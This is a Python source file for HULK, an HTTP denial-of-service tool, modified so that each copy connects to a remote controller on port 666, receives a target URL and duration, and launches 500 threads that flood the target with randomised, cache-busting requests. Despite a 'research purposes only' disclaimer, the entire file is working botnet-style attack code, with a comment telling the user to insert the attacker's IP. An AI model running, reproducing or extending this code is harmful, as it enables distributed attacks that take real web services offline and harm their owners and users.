# ----------------------------------------------------------------------------------------------
# HULK - HTTP Unbearable Load King
#
# this tool is a dos tool that is meant to put heavy load on HTTP servers in order to bring them
# to their knees by exhausting the resource pool, its is meant for research purposes only
# and any malicious usage of this tool is prohibited.
#
# author :  Barry Shteiman , version 1.0
# ----------------------------------------------------------------------------------------------
# Algumas alteracoes foram feitas pra conexao com o mestre e pra rodar no Python3.5

import urllib.request
import threading
import random
import time
import socket

#global params
headers_useragents=[]
headers_referers=[]

# generates a user agent array
def useragent_list():
    global headers_useragents
    headers_useragents.append('Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1')
    headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)')
    headers_useragents.append('Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)')
    headers_useragents.append('Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)')
    headers_useragents.append('Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51')
    return(headers_useragents)

# generates a referer array
def referer_list():
    global headers_referers
    headers_referers.append('http://www.google.com/?q=')
    headers_referers.append('http://www.usatoday.com/search/results?q=')
    headers_referers.append('http://engadget.search.aol.com/search?q=')
    headers_referers.append('http://' + host + '/')
    return(headers_referers)

#builds random ascii string
def buildblock(size):
    out_str = ''
    for i in range(0, size):
        a = random.randint(65, 90)
        out_str += chr(a)
    return(out_str)

#http request
def httpcall(url):
    useragent_list()
    referer_list()
    code=0
    if url.count("?")>0:
        param_joiner="&"
    else:
        param_joiner="?"
    request = urllib.request.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', random.choice(headers_useragents))
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + buildblock(random.randint(5,10)))
    request.add_header('Keep-Alive', random.randint(110,120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host',host)
    try:
        urllib.request.urlopen(request)
    except:
        pass

#http caller thread

class HTTPThread(threading.Thread):
    global tempo_maximo
    def run(self):
        try:
            while time.time() <  tempo_maximo:
                httpcall(url)
        except:
            pass

url = ''
host = ''
tempo_maximo = 0

#execute
while True:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        # Coloque o IP do atacante
        sock.connect(('localhost', 666))
        while True:
            data = sock.recv(1024).decode()
            url = data[0: data.find('|')]
            host = url[7:]
            tempo = data[data.find('|')+1:]
            tempo_maximo = time.time() + float(tempo)
            print ('INICIANDO HULK')
            for i in range(500):
                t = HTTPThread()
                t.start()
    except Exception as e:
        print(e)